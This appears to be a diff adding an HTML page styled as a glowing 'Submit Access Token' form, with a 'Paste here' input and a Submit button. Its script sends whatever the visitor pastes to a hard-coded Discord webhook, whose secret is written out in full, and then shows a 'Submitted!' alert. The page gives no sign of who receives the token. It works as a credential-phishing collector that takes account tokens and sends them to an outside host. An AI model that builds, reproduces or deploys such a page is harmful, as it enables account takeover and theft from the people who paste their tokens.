@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Submit Access</title>
+
+<style>
+
+body{
+margin:0;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+font-family:Arial;
+background:linear-gradient(black,#1a1a1a,#ffffff);
+}
+
+/* Glow background effect */
+
+body::before{
+content:"";
+position:absolute;
+width:500px;
+height:500px;
+background:radial-gradient(circle, rgba(255,255,255,0.4), transparent);
+filter:blur(120px);
+animation:glowMove 8s infinite alternate;
+}
+
+@keyframes glowMove{
+0%{transform:translate(-200px,-100px);}
+100%{transform:translate(200px,100px);}
+}
+
+/* Glass card */
+
+.container{
+position:relative;
+background:rgba(255,255,255,0.08);
+backdrop-filter:blur(15px);
+padding:40px;
+border-radius:15px;
+text-align:center;
+box-shadow:0 0 40px rgba(255,255,255,0.3);
+}
+
+/* Images */
+
+.images img{
+width:120px;
+border-radius:10px;
+margin:5px;
+box-shadow:0 0 20px rgba(255,255,255,0.6);
+}
+
+/* Title */
+
+h1{
+color:white;
+margin-bottom:20px;
+text-shadow:0 0 15px white;
+}
+
+/* Input */
+
+input{
+padding:12px;
+width:260px;
+border:none;
+border-radius:8px;
+outline:none;
+margin-bottom:20px;
+}
+
+/* Glowing button */
+
+button{
+padding:12px 30px;
+border:none;
+border-radius:30px;
+background:black;
+color:white;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 0 10px white,0 0 30px white;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.1);
+box-shadow:0 0 20px white,0 0 50px white;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="images">
+<img src="https://i.imgur.com/Fr0czWg.jpeg">
+<img src="https://i.imgur.com/ulSLhDy.jpeg">
+</div>
+
+<h1>Submit Access Token</h1>
+
+<input id="messageInput" placeholder="Paste here">
+
+<br>
+
+<button onclick="sendMessage()">Submit</button>
+
+</div>
+
+<script>
+
+function sendMessage(){
+
+const message=document.getElementById("messageInput").value;
+
+const webhook="https://discord.com/api/webhooks/1450681251655581726/uZOSEpFUt-2x9uBZvBelHt4wPWuO9XNvBTj4VW4HfEiVVWvFORankW-2pDFDwXexqF61";
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:"New message: "+message
+})
+});
+
+alert("Submitted!");
+
+}
+
+</script>
+
+</body>
+</html>
